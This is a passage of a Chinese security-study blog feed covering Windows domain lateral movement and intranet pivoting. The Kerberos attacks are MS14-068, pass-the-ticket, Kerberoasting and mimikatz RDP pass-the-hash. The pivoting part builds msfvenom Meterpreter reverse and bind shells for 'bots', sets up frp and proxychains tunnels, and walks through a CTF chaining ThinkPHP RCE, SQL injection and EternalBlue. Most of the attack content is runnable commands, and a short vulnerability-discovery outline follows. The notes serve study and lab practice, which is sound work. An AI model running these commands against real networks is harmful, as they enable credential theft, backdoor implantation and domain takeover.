class="selector-attr">[域控IP地址]</span> -<span class="selector-tag">p</span> <span class="selector-attr">[域成员密码]</span></span><br><span class="line">    MS14-<span class="number">068</span><span class="selector-class">.exe</span> -u mary@god<span class="selector-class">.org</span> -s S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">1218902331</span>-<span class="number">2157346161</span>-<span class="number">1782232778</span>-<span class="number">1124</span> -d <span class="number">192.168</span>.<span class="number">3.21</span> - <span class="selector-tag">p</span> admin!@#<span class="number">45</span></span><br><span class="line"><span class="number">4</span>.票据注入内存</span><br><span class="line">    kerberos::ptc TGT_mary@god<span class="selector-class">.org</span><span class="selector-class">.ccache</span></span><br><span class="line"><span class="number">5</span>. 查看凭证列表</span><br><span class="line">    klist</span><br><span class="line"><span class="number">6</span>.利用</span><br><span class="line">    dir \\<span class="number">192.168</span>.<span class="number">3.21</span>（这里好像只可以计算机名）\c$</span><br></pre></td></tr></table></figure>
<p><code>2、利用工具kekeo</code></p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">生成票据</span><br><span class="line">    .\kekeo <span class="string">&quot;tgt::ask /user:[域成员名] /domain:[域名] /ntlm:[ntlm值]&quot;</span></span><br><span class="line">    .\kekeo <span class="string">&quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695d……&quot;</span></span><br><span class="line">导入票据</span><br><span class="line">    kerberos::ptt [票据文件]</span><br><span class="line">    kerberos::ptt <span class="title class_">TGT_mary</span><span class="variable">@GOD</span>.<span class="title class_">ORG_krbtgt</span>~god.org<span class="variable">@GOD</span>.<span class="title class_">ORG</span>.kirbi</span><br><span class="line">查看凭证</span><br><span class="line">    klist</span><br><span class="line">利用net <span class="keyword">use</span>载入</span><br><span class="line">    dir \\<span class="number">192.168</span>.<span class="number">3.21</span>\c$</span><br></pre></td></tr></table></figure>
<p><code>3、利用本地票据（需管理权限-应该是类似于cookie窃取）</code><br>若在票据存活时间内有人连接过，就是收集本机之前连接过的票据收集起来，看还有没有效果。<br>利用mimikatz收集本地票据，再将票据导入到内存中进行连接。有存活时间限制</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    privilege::debug</span><br><span class="line">    sekurlsa::tickets /<span class="keyword">export</span></span><br><span class="line">    kerberos::ptt [票据文件]</span><br></pre></td></tr></table></figure>
<h4 id="传递-RDP"><a href="#传递-RDP" class="headerlink" title="传递|RDP"></a>传递|RDP</h4><h5 id="RDP协议"><a href="#RDP协议" class="headerlink" title="RDP协议"></a>RDP协议</h5><p>是一种远程的连接的协议，linux的ssh，windows的RDP（需要3389端口）。<br>域横向移动RDP传递-Mimikatz<br>除了上述讲到的IPC，WMI，SMB等协议的链接外，获取到的明文密码或HASH密文也可以通过RDP协议（远程桌面）进行链接操作。<br>1、判断对方远程桌面服务是否开启（默认：3389），端口扫描判断<br>2、RDP明文密码链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Windows：mstsc（远程桌面连接）-输入账号密码</span><br><span class="line">Windows命令行：mstsc.exe /console /v:[IP] /admin</span><br><span class="line">Linux：（需要安装rdesktop）rdesktop [IP]</span><br></pre></td></tr></table></figure>
<p>3、RDP密文HASH链接<br>windows Server需要开启Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启<br>同时如果Win 7和Windows Server 2008 R2安装了2871997、2973351补丁也支持，不过要开启cmd命令修改注册表：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">    REG <span class="keyword">ADD</span><span class="language-bash"> <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span></span><br></pre></td></tr></table></figure>
<p>4、通过mimikatz链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 <span class="string">&quot;/run:mstsc.exe /restrictedadmin&quot;</span> </span><br></pre></td></tr></table></figure>
<h3 id="域环境-SPN"><a href="#域环境-SPN" class="headerlink" title="域环境|SPN"></a>域环境|SPN</h3><p><img src="https://pic.imgdb.cn/item/65766d72c458853aefea528a.webp"></p>
<h4 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h4><p>1、当计算机加入域时，主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中。在安装新的服务后，SPN也会被记录在计算机账号的相应属性中。<br>2、SPN扫描也称为“扫描Kerberos服务实例名称”。在活动目录中发现服务的最佳方法就是SPN扫描。SPN扫描通过请求特定SPN类型的服务主体名称来查找服务。与网络端口扫描相比，SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口（不会因为触发内网中的IPS、IDS等设备的规则而产生大量的警告日志）。因为SPN查询是Kerberos票据行为的一部分，所以检测难度很大，因此，被防护软件拦截的可能性比nmap扫描低。<br>3、由于SPN扫描是基于LDAP协议向域控制器进行查询的，所以，攻击者只需要获得一个普通的域用户权限，就可以进行SPN扫描。<br><code>简而言之：在域环境中发现服务的最好办法就是通过“SPN扫描”通过请求特定SPN类型服务主体名称来查找服务。</code></p>
<h4 id="基于SPN扫描的攻击"><a href="#基于SPN扫描的攻击" class="headerlink" title="基于SPN扫描的攻击"></a>基于SPN扫描的攻击</h4><p>域横向移动SPN服务-探针，请求，导出，破解，重写<br><a href="https://www.cnblogs.com/backlion/p/8082623.html">https://www.cnblogs.com/backlion/p/8082623.html</a><br><code>过程：</code>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。<br><code>具体操作</code><br>以下操作都在PowerShell进行<br><code>1、探针（探针域内全部主机存在什么SPN服务）</code><br>什么权限都可以完成探针</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#探测域内服务</span></span><br><span class="line">    setspn -q */*</span><br><span class="line"><span class="meta">#寻找特定服务</span></span><br><span class="line">    setspn -q */* <span class="string">| findstr &quot;</span>[服务名]<span class="string">&quot;</span></span><br><span class="line"><span class="meta">#找到合适的服务作为攻击目标,回显要保存下来。</span></span><br></pre></td></tr></table></figure>
<p><code>2、请求（请求我们需要的服务）</code><br>清空当前机器中的凭证，防止影响下面的操作（可以不删除）</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">#查看已有票据</span><br><span class="line">    klist</span><br><span class="line">#删除已有票据</span><br><span class="line">    klist purge</span><br><span class="line">#请求对应服务</span><br><span class="line">    <span class="keyword">Add</span>-<span class="keyword">Type</span> -AssemblyName <span class="keyword">System</span>.IdentityModel</span><br><span class="line">    <span class="built_in">New</span>-<span class="keyword">Object</span> <span class="keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;[服务名(之前探针到的)]&quot;</span><br></pre></td></tr></table></figure>
<p>或使用mimikatz请求</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">    mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;kerberos::ask /target:[服务名]&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>3、导出</code></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#导出凭据</span></span><br><span class="line">    mimikatz.exe <span class="string">&quot;kerberos::list /export&quot;</span></span><br><span class="line"><span class="meta">#利用mimikatz导出，会导出到mimikatz所在的目录</span></span><br></pre></td></tr></table></figure>
<p><code>4、破解</code><br>破解凭据<br>可以将凭证复制到本地破解，避免提交破解的脚本<br>使用tgsrepcrack.py脚本加爆破字典来破解</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将凭据放在脚本文件目录中后</span></span><br><span class="line">    python3 .<span class="string">\tgsrepcrack.py</span> .<span class="string">\[密码文件.txt]</span> .<span class="string">\[凭据.kirbi]</span></span><br><span class="line">    python3 .<span class="string">\tgsrepcrack.py</span> .<span class="string">\password.txt</span> .<span class="string">\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0day.org1433-0DAY.ORG.kirbi</span></span><br><span class="line"><span class="comment">#破解成功会把被攻击的服务账户的明文密码显示出来，再想办法利用密码</span></span><br></pre></td></tr></table></figure>
<p><code>破解后，我多了一个用户|登录服务的密码，我可以那这个密码连接对应服务，或作为字典继续爆破；也可以进行重写</code><br><code>5、重写--进行提权？</code><br>类似于之前的PTT。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">#使用kerberoast.py和密码重写凭据(重新生成TGT)</span><br><span class="line">    python kerberoast<span class="selector-class">.py</span> -<span class="selector-tag">p</span> <span class="selector-attr">[得到的密码]</span> -r <span class="selector-attr">[已有的凭据.kirbi]</span> -w <span class="selector-attr">[新凭据的名字.kirbi]</span> -u <span class="number">500</span></span><br><span class="line">    python kerberoast<span class="selector-class">.py</span> -<span class="selector-tag">p</span> Password123 -r xxxx<span class="selector-class">.kirbi</span> -w PENTESTLAB<span class="selector-class">.kirbi</span> -u <span class="number">500</span></span><br><span class="line">    python kerberoast<span class="selector-class">.py</span> -<span class="selector-tag">p</span> <span class="selector-attr">[得到的密码]</span> -r <span class="selector-attr">[已有的凭据.kirbi]</span> -w <span class="selector-attr">[新凭据的名字.kirbi]</span> -g <span class="number">512</span></span><br><span class="line">    python kerberoast<span class="selector-class">.py</span> -<span class="selector-tag">p</span> Password123 -r xxxx<span class="selector-class">.kirbi</span> -w PENTESTLAB<span class="selector-class">.kirbi</span> -g <span class="number">512</span></span><br><span class="line">#“-u <span class="number">500</span>”指管理员，“-g <span class="number">512</span>”指管理员组</span><br></pre></td></tr></table></figure>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="meta">#将生成的票据注入内存</span></span><br><span class="line">    mimikatz.exe kerberos::ptt [票据文件.kirbi]</span><br><span class="line">    mimikatz.exe kerberos::ptt xxxx.kirbi</span><br></pre></td></tr></table></figure>
<p>用重写的凭据来链接，<code>不一定成功连接管理员账户</code>，且一般只能得到普通用户权限<br><code>结语</code><br>在使用cs工具时，内网的每台主机必须存在一张连接外网的网卡，cs才可成功控制。<br>如何克服：隧道代理。即，不是有一台是连接外网的吗，我就把这台连接外网的主机当作一个跳板，随后，其他主机通过这个隧道转发出去。<br>正向连接：自己连接靶机；反向连接：靶机反弹给自己的主机。<br>这就是下次要学习的内容。</p>
<h2 id="横向渗透-穿透"><a href="#横向渗透-穿透" class="headerlink" title="横向渗透|穿透"></a>横向渗透|穿透</h2><p><img src="https://pic.imgdb.cn/item/657eb779c458853aefe0dc09.webp"></p>
<h3 id="穿透-代理"><a href="#穿透-代理" class="headerlink" title="穿透|代理"></a>穿透|代理</h3><p>作用：两个内网的通信、也可以稍微解决一些防火墙的拦截</p>
<h4 id="代理-基础知识"><a href="#代理-基础知识" class="headerlink" title="代理|基础知识"></a>代理|基础知识</h4><p><code>1.区分内外网</code><br>IPv4地址设计时保留了一部分作为私有地址，它们不会被当作共有地址分配出去，而是只在局域网内使用<br>地址段                            掩码<br>10.x.x.x                       255.0.0.0<br>172.16.x.x-172.31.x.x          255.240.0.0<br>192.168.x.x                    255.255.0.0<br><code>2.内网间的通信问题</code><br>使用代理技术，不然无法通信<br><code>3.正向反向协议通信连接问题</code><br>正向：控制端到被控端<br>反向：被控端到控制端<br>一般都是反向连接？因为正向连接，内网ip不唯一，找不到；就算内网主机拥有一个外网的网卡（应该说是通过路由器可以访问到外网），可能因为路由配置（即：这个公网ip是路由器的）或者防火墙的限制也可能连接不上。</p>
<h4 id="代理-具体分析"><a href="#代理-具体分析" class="headerlink" title="代理|具体分析"></a>代理|具体分析</h4><p><img src="https://pic.imgdb.cn/item/657eb78fc458853aefe129dd.webp"><br>1、一般的木马是走http或tcp协议的，所以设置代理时，要选对协议。<br>2、使用Ngrok时，要注意msf生成木马的指令</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_http <span class="attribute">lhost</span>=xiaodisec.free.idcfengye.com <span class="attribute">lport</span>=80 -f exe -o</span><br><span class="line"><span class="comment">#reverse_http，代表木马传输数据走的是http协议，后面的lport端口也要写80；lhost写的是代理的ip</span></span><br><span class="line"><span class="comment">#然后将木马上传到肉鸡，运行即可。</span></span><br></pre></td></tr></table></figure>
<p>3、建议使用frp，但是需要一台黑黑的服务器，自建跳板。<br><code>具体使用frp</code><br>(1)、服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">服务器修改配置文件frps.ini：</span><br><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">6677</span>            <span class="comment">#frps工作端口，必须和frpc保持一致(msf与服务器连接的端口)</span></span><br><span class="line">启动服务端：</span><br><span class="line">.<span class="regexp">/frps -c ./</span>frps.ini</span><br></pre></td></tr></table></figure>
<p>(2)、控制端-下载-解压-修改-启动</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">控制端修改配置文件frpc.ini：</span><br><span class="line">[common]</span><br><span class="line">server_addr = [你的云主机ip]</span><br><span class="line">server_port = 6677         <span class="comment">#frpc工作端口，必须和frps保持一致</span></span><br><span class="line">[msf]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 5555            <span class="comment">#转发给本机的5555</span></span><br><span class="line">remote_port = 6000        <span class="comment">#服务端用6000端口转发给本机</span></span><br><span class="line">启动客户端：</span><br><span class="line">    ./frpc -c ./frpc.ini</span><br><span class="line">生成后门并上传至肉鸡</span><br><span class="line">    msfvenom -p windows/meterpreter/reverse_tcp lhost=[服务器IP地址] lport=6000 -f exe -o frp.exe</span><br><span class="line">监听后门</span><br><span class="line">    use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">    <span class="built_in">set</span> LHOST 127.0.0.1</span><br><span class="line">    <span class="built_in">set</span> LPORT 5555</span><br><span class="line">    exploit</span><br></pre></td></tr></table></figure>
<p>(3)、靶机运行frp即可</p>
<h4 id="代理-一道ctf夺旗"><a href="#代理-一道ctf夺旗" class="headerlink" title="代理|一道ctf夺旗"></a>代理|一道ctf夺旗</h4><p>三层漫游环境：<br><img src="https://pic.imgdb.cn/item/657eb7a0c458853aefe1663a.webp"><br><code>CFS三层内网漫游安全测试演练-某CTF线下2019</code><br>来源：2019某CTF线下赛真题内网结合WEB攻防题库，涉及WEB攻击，内网代理路由等技术，每台服务器存在一个Flag，获取每一个Flag对应一个积分，获取三个Flag结束。<br><code>Target1：</code><br>流程：探针目标-利用WEB漏洞(TP5_RCE)-获取webshell权限-获取Flag1-进入Target2<br>0、端口扫描，发现目标主机。发现ThinkPHPv5框架，使用对应的exp写入后门<br>1、生成反向后门：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">    msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=192.168.76.132 <span class="attribute">LPORT</span>=1111 -f elf &gt;t1.elf</span><br></pre></td></tr></table></figure>
<p>2、接受反弹：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">    <span class="built_in">set</span> LHOST 192.168.76.132</span><br><span class="line">    <span class="built_in">set</span> LPORT 1111</span><br><span class="line">    exploit</span><br></pre></td></tr></table></figure>
<p>此时，获得了第一台靶机的主机权限（相当于从webshell权限提升至主机权限），然后开始内网渗透，获取第二台靶机的flag。<br><code>在开始Target2之前，得要配置代理（即开启靶机1的内网网卡，作为代理，帮助我们渗透）</code><br>3、配置路由|配置代理|扫描靶机2<br>探索内网并添加路由，从而发现和联系上内网<br><code>（1）、配置路由</code><br>获取网络接口（获取网卡信息，实战中没有拓扑图，不知道网络情况）：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ifconfig是否也可以</span></span><br><span class="line"><span class="built_in">run</span> get_local_subnets</span><br></pre></td></tr></table></figure>
<p>查看路由地址：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">run</span> autoroute -p</span><br></pre></td></tr></table></figure>
<p>添加路由地址：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">run</span> autoroute -s <span class="number">192.168.22.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
<p><code>此时，靶机1和靶机2可以通信了。但是只受限于那个msf的会话，即添加后可以看到路由地址了，添加后可以使用MSFping通22网段了(只基于MSF会话可以通信)</code><br><img src="https://pic.imgdb.cn/item/657eb7b1c458853aefe19dfe.png"><br><code>（2）、配置代理|打通内网</code><br>现在的会话是session1，是建立在Target1的shell上的，建立路由后可以和22网段进行通信。那么我们想要通过session1用工具去攻击22网段，这个时候该怎么办呢？<br>(为了解决这种情况，我们可以在本地(msf上有模块可以开代理)开一个代理，通过这个代理给其他人一个端口去连接，然后我们就可以用自己的本机(自己的电脑，不是攻击机kali)去连接kali的端口，这样就能访问192.168.22.129)<br>可以使用sock4+proxychains4代理打通内网</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">background   保存拿到的shell会话，隐藏到后台</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line"><span class="keyword">set</span> srvport <span class="comment">2222</span></span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
<p><code>（3）、利用本地代理接口访问测试</code><br>自己再准备一台攻击机（或者在本机另开一个shell）<br>linux：<br>配置proxychains（kali自带）后调用工具探针Target2</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br><span class="line">socks4 <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span> <span class="number">2222</span></span><br><span class="line">proxychains4 nmap -<span class="keyword">sT</span> -Pn <span class="number">192.168</span><span class="number">.22</span><span class="number">.0</span>/<span class="number">24</span> -p80</span><br><span class="line">-Pn：不使用<span class="built_in">ping</span>扫描，不执行主机发现，默认目标主机是存活的，可以绕开防火墙。</span><br><span class="line">-<span class="keyword">sT</span>：使用TCP连接，与目标三次握手，来确定端口是否开放</span><br></pre></td></tr></table></figure>
<p>然后具体扫靶机2就可以（一般扫80足矣）。<br>浏览器：<br>为了顺利访问到Target2的网页，需要设置浏览器代理进行访问（比如：浏览器-&gt;设置-&gt;网络-&gt;sock4-&gt;写上刚刚配置的代理）<br>其他工具也需要设置代理<br>windows：<br>利用代理工具Proxifier或SocksCap64,配置好后,将要使用的工具加入里面就可以了<br><code>Target2</code><br>现在我通过攻击机成功访问到了靶机2的网页，接下来就实施攻击。<br><code>过程：探针目标-利用WEB漏洞(SQL注入)-后台获取webshell权限-获取Flag-进入Target3</code><br>0、漏洞利用，注入：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">22.128</span>/index.php?r=vul&amp;keyword=<span class="number">1</span>         <span class="comment">#sql注入</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">22.128</span><span class="regexp">/index.php?r=admini/</span>public/login    <span class="comment">#后台</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">22.128</span>/index.php?r=special                <span class="comment">#后门shell写入</span></span><br></pre></td></tr></table></figure>
<p>通过robots.txt找到后台登陆地址，通过后台功能拿webshell，同时flag2到手。<br><code>此时是webshell权限，还是要提一下权</code><br>此时，要用蚁剑连接，刚好上面有代理设置，设置一下就可以连接；或者使用全局代理工具<code>Proxifier</code>；或者使用代理进程工具<code>SocksCap64</code>（直接将工具拖进去就可以正常在内网工作）。<br><code>接下来是重点：由于靶机2只有22|33网段的网卡，但是攻击机在76网段，所以反向连接不了；而我的kali之前配置过22网段的路由，所以kali可以找到靶机2，因此要正向连接</code><br>1、生成正向后门：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">   msfvenom -p linux<span class="regexp">/x64/m</span>eterpreter/bind_tcp LPORT=<span class="number">3333</span> -f elf &gt; t2.elf</span><br><span class="line"><span class="comment">#绑定本地的3333端口</span></span><br></pre></td></tr></table></figure>
<p>2、访问接受|反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">    <span class="built_in">set</span> rhost 192.168.22.128</span><br><span class="line">    <span class="built_in">set</span> LPORT 3333</span><br><span class="line">    exploit</span><br><span class="line"><span class="comment">#找到靶机2的ip</span></span><br></pre></td></tr></table></figure>
<p>3、信息收集及配置访问<br>还是一样，再开通33网段的路由。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">获取网络接口：<span class="built_in">run</span> get_local_subnets</span><br><span class="line">查看路由地址：<span class="built_in">run</span> autoroute -p</span><br><span class="line">添加路由地址：<span class="built_in">run</span> autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure>
<p>4、转入target3<br><code>Target3:</code><br>探针目标-端口及漏洞扫描-利用MS17010获取系统权限-获取Flag3-拿下<br>扫描33网段</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> nmap -Pn -sT <span class="number">192.168.33.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
<p>主机漏洞扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxychains4</span> nmap -script=vuln <span class="number">192.168.33.33</span> -<span class="literal">oN</span> nmapscan/vuln</span><br></pre></td></tr></table></figure>
<p>发现这是开放着445、3389端口的Windows系统 ，尝试使用永恒之蓝试试</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">bind_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">RHOST 192.168.33.33</span></span><br><span class="line">options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>成功反弹</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">net <span class="keyword">user</span></span><br><span class="line"><span class="title">或getuid</span></span><br></pre></td></tr></table></figure>
<p>找|读取flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">dir</span> /S *flag* /B <span class="comment">#找flag</span></span><br><span class="line"><span class="built_in">type</span> C:\Windows\System32\config\flag.txt <span class="comment">#读取flag</span></span><br><span class="line"><span class="comment"># /B 显示文件夹或文件的名字</span></span><br><span class="line"><span class="comment"># /S 显示指定目录和所有子目录中的文件。</span></span><br><span class="line"><span class="comment"># dir /S /B *flag* 这样写也可以</span></span><br></pre></td></tr></table></figure>
<p>取材：<a href="https://blog.csdn.net/weixin_60329395/article/details/126001763">https://blog.csdn.net/weixin_60329395/article/details/126001763</a><br><code>后面msf和cs配合使用也很重要</code></p>
<h3 id="穿透-隧道"><a href="#穿透-隧道" class="headerlink" title="穿透|隧道"></a>穿透|隧道</h3><p>作用：解决一些安全设备、防火墙的拦截的问题（回传数据）</p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞探测发现|os|web|app|api接口|端口|探针</title>
    <url>/2023/10/29/osTanzhen/</url>
    <content><![CDATA[<h2 id="os-大纲"><a href="#os-大纲" class="headerlink" title="os|大纲"></a>os|大纲</h2><p><img src="https://pic.imgdb.cn/item/653e6cb0c458853aefcf5f00.jpg" alt="图一" title="对于如何发现操作系统漏洞的大纲"></p>
<h3 id="操作系统漏洞发现"><a href="#操作系统漏洞发现" class="headerlink" title="操作系统漏洞发现"></a>操作系统漏洞发现</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">讲解整体知识点,简要概况:2:00</a><br>1、操作系统漏洞发现的意义:安全测试的目标是一个网站或者是服务器上面的一个应用(服务)。如果说操作系统存在漏洞,那么我们就不用对于这特定的服务或者应用进行漏洞发现。比如说对于一个网站,抛开网站本身的漏洞不谈,如果其服务器上的操作系统存在漏洞,我们可以获取其os的权限,从而可以直接获取网站|服务器的权限。<br>2、对os漏洞进行分类,可以知道后期在利用时需不需要前提条件(如是否需要一个低权限),以及有啥效果。<br>3、如何预知漏洞:需要大量经验。</p>
<h3 id="os漏洞发现-具体分析"><a href="#os漏洞发现-具体分析" class="headerlink" title="os漏洞发现|具体分析"></a>os漏洞发现|具体分析</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">第一部分:漏洞探针:6:10</a><br>对于os层面的漏洞,大部分是依靠工具进行探针。<br>1、Goby:<a href="https://blog.csdn.net/m0_59856951/article/details/131112658">https://blog.csdn.net/m0_59856951/article/details/131112658</a><br>2、Nmap:<br>(1)、Nmap –script&#x3D;vuln 网段ip –默认nse插件(参数)<br>(2)、Nmap vulscan vulners 网段ip –调用第三方库探针(vulscan vulners较为知名)<br>加入拓展扫描模块:<a href="https://cnblogs.com/shwang/p/12623669.html">https://cnblogs.com/shwang/p/12623669.html</a><br>3、Nessus:<a href="https://blog.csdn.net/qq_51577576/article/details/123211031">https://blog.csdn.net/qq_51577576/article/details/123211031</a><br>扫得最全面但安装配置麻烦。<br>介绍一些概念:<br><a href="https://blog.csdn.net/dzqxwzoe/article/details/129024273">https://blog.csdn.net/dzqxwzoe/article/details/129024273</a><br><a href="https://blog.csdn.net/A_991128a/article/details/133786308">https://blog.csdn.net/A_991128a/article/details/133786308</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">第二部分:漏洞类别区分讲解-权限提升、远程执行、缓冲区溢出(思路):31:10</a><br>1、较有用的三种os漏洞类型:远程执行、权限提升、缓冲区溢出。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">第三部分:漏洞利用框架演示(具体操作在48:10):38:10</a><br>1、发现os漏洞如何利用(寻找有没有可以用的exp):<br>(1)、工具框架：Metasploit、Searchploit–kali、忍者系统有。<br>(2)、单点exp：seebug、cnvd、1337day、exploit-db、github。<br>(3)、网上文章复现(类似于wp)–也可以在github找可以用的。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=41&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">第四部分:修复:1:12:10</a><br>1、打补丁<br>2、关闭入口(端口)<br>3、防护应用</p>
<h2 id="WEB-大纲"><a href="#WEB-大纲" class="headerlink" title="WEB|大纲"></a>WEB|大纲</h2><p><img src="https://pic.imgdb.cn/item/6541a3f7c458853aefe36fe9.png" alt="图二" title="对于如何发现WEB应用漏洞的大纲"></p>
<h3 id="WEB应用漏洞探测发现"><a href="#WEB应用漏洞探测发现" class="headerlink" title="WEB应用漏洞探测发现"></a>WEB应用漏洞探测发现</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=42&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">对以下三类的一个讲解:1:20</a><br>1、已知 CMS<br>如常见的 dedecms.discuz(论坛),wordpress(博客) 等源码结构(自己开发的,并公开到网上)，这种一般采用非框架类开发，但也有少部分采用的<br>是框架类开发，针对此类源码程序的安全检测，我们要利用公开的漏洞进行测试，如不存在可采用<br>白盒代码审计自行挖掘。<br>2、开发框架<br>如常见的 thinkphp，spring,flask 等开发的源码程序，这种源码程序正常的安全测试思路：先获取对<br>应的开发框架信息(名字，版本)，通过公开的框架类安全问题进行测试，如不存在可采用白盒代码审<br>计自行挖掘。<br>3、未知 CMS<br>如常见的企业或个人内部程序源码，也可以是某 CMS 二次开发的源码结构，针对此类的源码程序测<br>试思路：能识别二次开发就按已知 CMS 思路进行，不能确定二次开发的话可以采用常规综合类扫描<br>工具或脚本进行探针，也可以采用人工探针（功能点，参数，盲猜），同样在有源码的情况下也可以<br>进行代码审计自行挖掘。</p>
